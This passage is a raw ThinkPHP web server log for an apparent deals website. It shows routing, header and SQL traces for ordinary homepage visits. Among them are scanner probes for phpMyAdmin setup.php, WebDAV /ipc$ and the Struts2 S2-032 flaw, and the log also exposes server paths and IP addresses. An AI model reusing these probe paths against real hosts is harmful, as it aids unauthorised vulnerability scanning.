---------------------------------------------------------------
[ 2017-10-06T00:37:21+08:00 ] 10.135.33.45 185.110.132.239 GET /
[ info ] 119.29.24.237/ [运行时间：0.070006s][吞吐率：14.28req/s] [内存消耗：2,367.30kb] [文件加载：59]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Scanbot',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\119.29.24.237\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\119.29.24.237\public/../application/index\view\index\index.html [ array (
  0 => 'citys',
  1 => 'city',
  2 => 'cats',
  3 => 'controller',
  4 => 'user',
  5 => 'title',
  6 => 'bigImages',
  7 => 'smallImages',
  8 => 'foodCates',
  9 => 'dealFoods',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001316s ] mysql:dbname=o2o;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_city` [ RunTime:0.001303s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `parent_id` <> 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000760s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `uname` = 'bozhou' LIMIT 1 [ RunTime:0.000973s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_category` [ RunTime:0.000953s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 5 [ RunTime:0.000561s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` IN (1,6,9,8,2)  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.001019s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_featured` [ RunTime:0.001145s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 LIMIT 1 [ RunTime:0.000424s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000531s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 LIMIT 1 [ RunTime:0.000401s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000429s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_deal` [ RunTime:0.001164s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_deal` WHERE  `end_time` > 1507221441  AND `category_id` = 1  AND `city_id` = 12  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 10 [ RunTime:0.000686s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 1  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 4 [ RunTime:0.000436s ]
---------------------------------------------------------------
[ 2017-10-06T01:09:14+08:00 ] 10.135.33.45 185.40.4.29 GET /
[ info ] 119.29.24.237/ [运行时间：0.243377s][吞吐率：4.11req/s] [内存消耗：2,368.34kb] [文件加载：59]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1',
  'accept-language' => 'en-US;q=0.6,en;q=0.4',
  'accept-encoding' => 'deflate, gzip, identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\119.29.24.237\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\119.29.24.237\public/../application/index\view\index\index.html [ array (
  0 => 'citys',
  1 => 'city',
  2 => 'cats',
  3 => 'controller',
  4 => 'user',
  5 => 'title',
  6 => 'bigImages',
  7 => 'smallImages',
  8 => 'foodCates',
  9 => 'dealFoods',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001028s ] mysql:dbname=o2o;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_city` [ RunTime:0.187102s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `parent_id` <> 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000601s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `uname` = 'bozhou' LIMIT 1 [ RunTime:0.000460s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_category` [ RunTime:0.001013s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 5 [ RunTime:0.000519s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` IN (1,6,9,8,2)  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000590s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_featured` [ RunTime:0.000982s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 LIMIT 1 [ RunTime:0.000410s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000522s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 LIMIT 1 [ RunTime:0.000323s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000435s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_deal` [ RunTime:0.000861s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_deal` WHERE  `end_time` > 1507223354  AND `category_id` = 1  AND `city_id` = 12  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 10 [ RunTime:0.000726s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 1  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 4 [ RunTime:0.000446s ]
---------------------------------------------------------------
[ 2017-10-06T01:15:55+08:00 ] 10.135.33.45 113.108.10.5 GET /myadmin/scripts/setup.php
[ info ] 119.29.24.237/myadmin/scripts/setup.php [运行时间：0.019628s][吞吐率：50.95req/s] [内存消耗：974.05kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'myadmin',
    1 => 'scripts',
    2 => 'setup.php',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/myadmin/scripts/setup_php' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T01:19:39+08:00 ] 10.135.33.45 59.17.113.198 GET /
[ info ] 119.29.24.237/ [运行时间：0.343845s][吞吐率：2.91req/s] [内存消耗：2,367.19kb] [文件加载：59]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\119.29.24.237\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\119.29.24.237\public/../application/index\view\index\index.html [ array (
  0 => 'citys',
  1 => 'city',
  2 => 'cats',
  3 => 'controller',
  4 => 'user',
  5 => 'title',
  6 => 'bigImages',
  7 => 'smallImages',
  8 => 'foodCates',
  9 => 'dealFoods',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001006s ] mysql:dbname=o2o;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_city` [ RunTime:0.000973s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `parent_id` <> 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000616s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `uname` = 'bozhou' LIMIT 1 [ RunTime:0.000500s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_category` [ RunTime:0.000822s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 5 [ RunTime:0.000489s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` IN (1,6,9,8,2)  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000537s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_featured` [ RunTime:0.000872s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 LIMIT 1 [ RunTime:0.289520s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000432s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 LIMIT 1 [ RunTime:0.000345s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000377s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_deal` [ RunTime:0.000899s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_deal` WHERE  `end_time` > 1507223979  AND `category_id` = 1  AND `city_id` = 12  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 10 [ RunTime:0.000556s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 1  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 4 [ RunTime:0.000470s ]
---------------------------------------------------------------
[ 2017-10-06T06:48:22+08:00 ] 10.135.33.45 113.108.21.80 GET /
[ info ] 119.29.24.237/ [运行时间：0.742420s][吞吐率：1.35req/s] [内存消耗：2,368.47kb] [文件加载：59]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\119.29.24.237\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\119.29.24.237\public/../application/index\view\index\index.html [ array (
  0 => 'citys',
  1 => 'city',
  2 => 'cats',
  3 => 'controller',
  4 => 'user',
  5 => 'title',
  6 => 'bigImages',
  7 => 'smallImages',
  8 => 'foodCates',
  9 => 'dealFoods',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.205329s ] mysql:dbname=o2o;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_city` [ RunTime:0.440812s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `parent_id` <> 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.039597s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `uname` = 'bozhou' LIMIT 1 [ RunTime:0.000481s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_category` [ RunTime:0.001199s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 5 [ RunTime:0.000857s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` IN (1,6,9,8,2)  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000995s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_featured` [ RunTime:0.001228s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 LIMIT 1 [ RunTime:0.000530s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000578s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 LIMIT 1 [ RunTime:0.000348s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000408s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_deal` [ RunTime:0.000896s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_deal` WHERE  `end_time` > 1507243702  AND `category_id` = 1  AND `city_id` = 12  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 10 [ RunTime:0.000682s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 1  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 4 [ RunTime:0.000477s ]
---------------------------------------------------------------
[ 2017-10-06T11:24:19+08:00 ] 10.135.33.45 112.90.82.218 GET /
[ info ] 119.29.24.237/ [运行时间：0.103911s][吞吐率：9.62req/s] [内存消耗：2,368.47kb] [文件加载：59]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\119.29.24.237\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\119.29.24.237\public/../application/index\view\index\index.html [ array (
  0 => 'citys',
  1 => 'city',
  2 => 'cats',
  3 => 'controller',
  4 => 'user',
  5 => 'title',
  6 => 'bigImages',
  7 => 'smallImages',
  8 => 'foodCates',
  9 => 'dealFoods',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001366s ] mysql:dbname=o2o;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_city` [ RunTime:0.036012s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `parent_id` <> 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000943s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_city` WHERE  `uname` = 'bozhou' LIMIT 1 [ RunTime:0.000895s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_category` [ RunTime:0.001055s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 0  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 5 [ RunTime:0.000568s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` IN (1,6,9,8,2)  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc [ RunTime:0.000564s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_featured` [ RunTime:0.000972s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 LIMIT 1 [ RunTime:0.000434s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 0 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000394s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 LIMIT 1 [ RunTime:0.000344s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_featured` WHERE  `status` = 1  AND `type` = 1 ORDER BY `id`  desc LIMIT 0,10 [ RunTime:0.000353s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `o2o_deal` [ RunTime:0.000927s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_deal` WHERE  `end_time` > 1507260259  AND `category_id` = 1  AND `city_id` = 12  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 10 [ RunTime:0.000560s ]
[ sql ] [ SQL ] SELECT * FROM `o2o_category` WHERE  `parent_id` = 1  AND `status` = 1 ORDER BY `listorder`  desc,`id`  desc LIMIT 4 [ RunTime:0.000455s ]
---------------------------------------------------------------
[ 2017-10-06T12:14:08+08:00 ] 10.135.33.45 101.104.55.139 OPTIONS /ipc$
[ info ] 119.29.24.237/ipc$ [运行时间：0.019747s][吞吐率：50.64req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ipc$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/ipc$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:42:17+08:00 ] 10.135.33.45 101.104.39.70 OPTIONS /IPC$
[ info ] 119.29.24.237/IPC$ [运行时间：0.019548s][吞吐率：51.16req/s] [内存消耗：972.31kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'IPC$',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '119.29.24.237',
  'translate' => 'f',
  'user-agent' => 'Microsoft-WebDAV-MiniRedir/6.1.7601',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/IPC$' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:32+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionwp-includes/js/comment-reply.min.js
[ info ] 119.29.24.237/struts2-032/index.actionwp-includes/js/comment-reply.min.js [运行时间：0.020381s][吞吐率：49.07req/s] [内存消耗：975.26kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionwp-includes',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionwp-includes/js/comment-reply_min_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:33+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionskins/vector/csshover.htc
[ info ] 119.29.24.237/struts2-032/index.actionskins/vector/csshover.htc [运行时间：0.023859s][吞吐率：41.91req/s] [内存消耗：975.08kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionskins',
    2 => 'vector',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionskins/vector/csshover_htc' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:33+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionmisc/states.js
[ info ] 119.29.24.237/struts2-032/index.actionmisc/states.js [运行时间：0.016123s][吞吐率：62.02req/s] [内存消耗：975.02kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionmisc',
    2 => 'states.js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionmisc/states_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:34+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionstatic/js/md5.js
[ info ] 119.29.24.237/struts2-032/index.actionstatic/js/md5.js [运行时间：0.018385s][吞吐率：54.39req/s] [内存消耗：975.06kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionstatic',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionstatic/js/md5_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:35+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actioninclude/js/md5.js
[ info ] 119.29.24.237/struts2-032/index.actioninclude/js/md5.js [运行时间：0.017663s][吞吐率：56.62req/s] [内存消耗：975.05kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actioninclude',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actioninclude/js/md5_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:35+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actioninclude/js/common.js
[ info ] 119.29.24.237/struts2-032/index.actioninclude/js/common.js [运行时间：0.017827s][吞吐率：56.10req/s] [内存消耗：975.08kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actioninclude',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actioninclude/js/common_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:36+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actioninclude/js/ajax.js
[ info ] 119.29.24.237/struts2-032/index.actioninclude/js/ajax.js [运行时间：0.018185s][吞吐率：54.99req/s] [内存消耗：975.07kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actioninclude',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
